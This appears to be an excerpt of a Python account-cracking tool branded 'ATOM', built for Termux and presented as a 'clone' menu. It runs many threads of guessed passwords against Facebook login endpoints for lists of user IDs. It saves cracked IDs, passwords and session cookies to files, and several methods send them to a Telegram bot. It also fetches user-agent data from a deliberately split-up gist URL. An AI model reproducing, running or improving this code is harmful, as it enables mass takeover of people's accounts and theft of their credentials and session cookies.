...
fst=f'{dot}[{H}sumon{M}-{H}milon{M}-{H}ATOM{M}-{H}sakshi{M}-{H}mimi{P}]'
...
def ua_valid():
    rr = random.randint
    rc = random.choice
    model2 = requests.get('https://gi'+'st.githubus'+'ercontent.com/ATOM-XD/c3d50589'+'d804b5b7ab5a7717a22cfe0d/raw/6937320508d'+'d57dd78d0c2'+'97d532fdc233306d01/m'+'dls.txt').text.splitlines()
...
def ATOM():
    ____banner____()
    print(f'{rad}[{white}A{rad}]{rad}[{white}1{rad}]\033[1;37mFILE CLONE')
    print(f'{rad}[{white}B{rad}]{rad}[{white}2{rad}]\033[1;37mMAIL CLONE')
    print(f'{rad}[{white}C{rad}]{rad}[{white}3{rad}]\033[1;37mRANDOM CLONE')
    ...
    __ATOM__ = input(f'{rad}[{white}🔖{rad}] {green}Selection  {white}▶︎ {yelloww}')
    if __ATOM__ in ['A','a','01','1']:__FILEX__()
    elif __ATOM__ in ['B','b','02','2']:print(f'\n[×]{rad}coming soon... ');ATOM()
    elif __ATOM__ in ['C','c','03','3']:SETINGX()
    elif __ATOM__ in ['D','d','04','4']:os.system("xdg-open https://chat.whatsapp.com/")
    elif __ATOM__ in ['E','e','05','5']:os.system("xdg-open https://wa.me/+918389066877")
    else:print(f'\n[×]{rad} Choose Value Option... ');ATOM()

#━━━━[ SELECT MENU ]━━━━#
def SETINGX():
    ____banner____()
    print(f"{K} [{H}1{K}] {WHITE}RANDOM INDIA")
    print(f"{K} [{H}2{K}] {WHITE}RANDOM STR RANGE 4")
    print(f"{K} [{H}3{K}] {WHITE}RANDOM STR RANGE 5");linex()
    __ATOMi__ = input(f'{rad}[{white}🔖{rad}]{green} SELECTION  {white}▶︎ {yelloww}')
    if __ATOMi__ in ['A','a','01','1']:RANDOM()
    elif __ATOMi__ in ['B','b','02','2']:INDIA()
    elif __ATOMi__ in ['C','c','03','3']:PAKISTAN()
...
def m1(ids,pwv):
    ...
    try:
        for pas in pwv:
            ...
            free_fb = session.get(f"https://x.prod.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8").text
            info={
    ...
    "lsd": re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),}
            update= {'Host': 'x.prod.facebook.com',
    'Content-Length': '1730',
    ...
    'Accept': '*/*',
    'Origin': 'x.prod.facebook.com',
    'Sec-Fetch-Site': 'same-origin',
    'Sec-Fetch-Mode': 'cors',
    'Sec-Fetch-Dest': 'empty',
    'Referer': 'x.prod.facebook.com',
    'Accept-Encoding': 'gzip, deflate, br',
    'Accept-Language': 'en-IE,en-US;q=0.9,en;q=0.8'}
            response=session.post("https://x.prod.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100",data = info,headers = update,allow_redirects = False)
            ...
            if "c_user" in response:
                ...
                if "live" in check:
                    ...
                    if len(bkas)% 2 == 0:
                        ...
                        print(f" {green}(ATOM-OK) {cid}|{pas} ")
                        print(f" {green}Cookie : {warna}{coki}")
                        open("/sdcard/ATOM-COOKIE-OK.txt", "a").write(f"{cid}|{pas}|{coki}\n")
                        oks.append(cid)
                        break
                else:
                    break
...
def m2(ids,pwv):
    ...
    try:
        for pas in pwv:
            ...
            free_fb = session.get(f"https://limited.facebook.com/login.php", headers=head).text
            info={
            "m_ts": re.search('name="m_ts" value="(.*?)"',str(free_fb)).group(1),
            "li": re.search('name="li" value="(.*?)"',str(free_fb)).group(1),
            "try_number": "0",
            ...
            "jazoest": re.search('name="jazoest" value="(.*?)"',str(free_fb)).group(1),
            "lsd": re.search('"lsd":"(.*?)"',str(free_fb)).group(1),
            "__dyn": "1KQdAG1mws8-t0BBBzEnwSwgE98nwgU2owpUuwcC4o1nEhw23E52q1ew6ywaq1Jw20Ehw73wGwcq0RE1u81x82ew5fw5NyE1582ZwrU2pw4swSw7zwde0UE",
            "__csr": "",
            "__hsdp": "",
            "__hblp": "",
            "__sjsp": "",
            "__req": "2",
            "__fmt": "1",
            "__a": "AYrw8x7azNJ-fEEuayTvb5MXL6MuDzV38PqfxEJRU1B8w1VQEejSKz-ilssAMYWmFz6K12HBn0vmJ7ln1-WB-bCfqCvheZgVnAYK_pA32rGNrA",
            "__user": "0"
            }
            update= {
            'accept': '*/*',
            ...
            'priority': 'u=1, i',
            'referer': 'https://limited.facebook.com/login.php?skip_api_login=1&api_key=1167750614510909&kid_directed_site=0&app_id=1167750614510909&signed_next=1&next=https://m.facebook.com/v21.0/dialog/oauth?app_id=1167750614510909&cbt=1758301424077&channel_url=https%3A%2F%2Fstaticxx.facebook.com%2Fx%2Fconnect%2Fxd_arbiter%2F%3Fversion%3D46%23cb%3Df1cc55eb8e33059fd%26domain%3Dwww.ailabtools.com%26is_canvas%3Dfalse%26origin%3Dhttps%253A%252F%252Fwww.ailabtools.com%252Ffef9461944ebd707d%26relation%3Dopener&client_id=1167750614510909&display=touch&domain=www.ailabtools.com&e2e=%7B%7D&fallback_redirect_uri=https%3A%2F%2Fwww.ailabtools.com%2Faccount%2Flogin&locale=en_US&logger_id=fc886f70e5b824775&origin=2&redirect_uri=https%3A%2F%2Fstaticxx.facebook.com%2Fx%2Fconnect%2Fxd_arbiter%2F%3Fversion%3D46%23cb%3Df0fe12f165f974d3b%26domain%3Dwww.ailabtools.com%26is_canvas%3Dfalse%26origin%3Dhttps%253A%252F%252Fwww.ailabtools.com%252Ffef9461944ebd707d%26relation%3Dopener%26frame%3Df797ddec80635793e&response_type=token%2Csigned_request%2Cgraph_domain&sdk=joey&version=v21.0&refsrc=deprecated&ret=login&fbapp_pres=0&tp=unspecified&cancel_url=https://staticxx.facebook.com/x/connect/xd_arbiter/?version=46',
...
def __FILEX__():
    global oks,cps
    ____banner____()
    dfile = input(f'{rad}[{white}🔖{rad}] {green}EXAMPLE {rad}[{white}/sdcard/ATOM.txt{rad}]\n{rad}[{white}🔖{rad}] {green}INPUT FILE PATH {white}▶︎ {yelloww}');linex()
    try:
    ...
    with ThreadPool(max_workers=50) as ATOM:
        ...
        for user in dx:
            ...
            if __METHOD__ in ["A","a","1","01"]:
                ATOM.submit(__MTDONEE__,ids,names,passlist,total_ids)
            elif __METHOD__ in ["B","b","2","02"]:
                ATOM.submit(__MTDTWOO__,ids,names,passlist,total_ids)
            elif __METHOD__ in ["C","c","3","03"]:
                ATOM.submit(__MTDTHREE__,ids,names,passlist,total_ids)
            elif __METHOD__ in ["D","d","4","04"]:
                ATOM.submit(__MTDFOUR__,ids,names,passlist,total_ids)
            elif __METHOD__ in ["E","e","5","05"]:
                ATOM.submit(__MTDFIVE__,ids,names,passlist,total_ids)
            elif __METHOD__ in ["F","f","6","06"]:
                ATOM.submit(__MTDSIX__,ids,names,passlist,total_ids)
            else:
                ATOM.submit(__MTDONEE__,ids,names,passlist,total_ids)
    print('');linex()
    ...
    try:
        ...
        for fikr in passlist:
            ...
            if 'access_token' in q:
                ...
                ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);AJb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");kuki = f"sb={AJb};{ckkk}"
                print(f'\r\r{rad}[{green}ATOM-OK{rad}]{green} {ids} {rad}: {green}{pas}')
                print(f"\r\r{rad}[{green}COOKIES=[🤖]{rad}]: {warna}{kuki}")
                cek_apk(kuki)
                oks.append(ids)
                statusok = (f" {ids} | {pas} | {kuki} ")
                requests.post(f"https://api.telegram.org/bot"+str(token)+"/sendMessage?chat_id="+str(ID)+"&text="+str(statusok))
                open('/sdcard/ATOM-M1-OK.txt','a').write(ids+'|'+pas+'\n');open('/sdcard/ATOM-M6-OK-COOKIE.txt','a').write(ids+'|'+pas+'|'+kuki+'\n')
                break
    ...
    try:
        ...
        for fikr in passlist:
            ...
            if 'access_token' in q:
                ...
                statusok = (f" {ids} | {pas} | {kuki} ")
                requests.post(f"https://api.telegram.org/bot"+str(token)+"/sendMessage?chat_id="+str(ID)+"&text="+str(statusok))
                open('/sdcard/ATOM-M2-OK.txt','a').write(ids+'|'+pas+'\n');open('/sdcard/ATOM-M6-OK-COOKIE.txt','a').write(ids+'|'+pas+'|'+kuki+'\n')
                break
    ...
    try:
        ...
        for fikr in passlist:
            ...
            if 'access_token' in load:
                ...
                print(f'\r\r{rad}[{green}ATOM-OK{rad}]{green} {ids} {rad}: {green}{pas}')
                print(f"\r\r{rad}[{green}COOKIES=[🤖]{rad}]: {warna}{kuki}")
                open('/sdcard/ATOM-M3-OK.txt','a').write(ids+'|'+pas+'\n');open('/sdcard/ATOM-M3-OK-COOKIE.txt','a').write(ids+'|'+pas+'|'+kuki+'\n')
                oks.append(ids)
                break
    ...
    try:
        ...
        for fikr in passlist:
            ...
            if 'access_token' in q:
                ...
                statusok = (f" {ids} | {pas} | {kuki} ")
                requests.post(f"https://api.telegram.org/bot"+str(token)+"/sendMessage?chat_id="+str(ID)+"&text="+str(statusok))
                open('/sdcard/ATOM-M4-OK.txt','a').write(ids+'|'+pas+'\n');open('/sdcard/ATOM-M6-OK-COOKIE.txt','a').write(ids+'|'+pas+'|'+kuki+'\n')
                break
            elif "User must verify their account" in po:
                cps.append(ids)
                #print(f'\r\r{rad}[ATOM-CP]{rad} {ids} {rad}| {pas}')
    ...
    try:
        ...
        for fikr in passlist:
            ...
            if 'access_token' in q:
                ...
                statusok = (f" {ids} | {pas} | {kuki} ")
                requests.post(f"https://api.telegram.org/bot"+str(token)+"/sendMessage?chat_id="+str(ID)+"&text="+str(statusok))
                open('/sdcard/ATOM-M6-OK.txt','a').write(ids+'|'+pas+'\n');open('/sdcard/ATOM-M6-OK-COOKIE.txt','a').write(ids+'|'+pas+'|'+kuki+'\n')
                break
            elif "User must verify their account" in po:
                cps.append(ids)
                #print(f'\r\r{rad}[ATOM-CP]{rad} {ids} {rad}| {pas}')
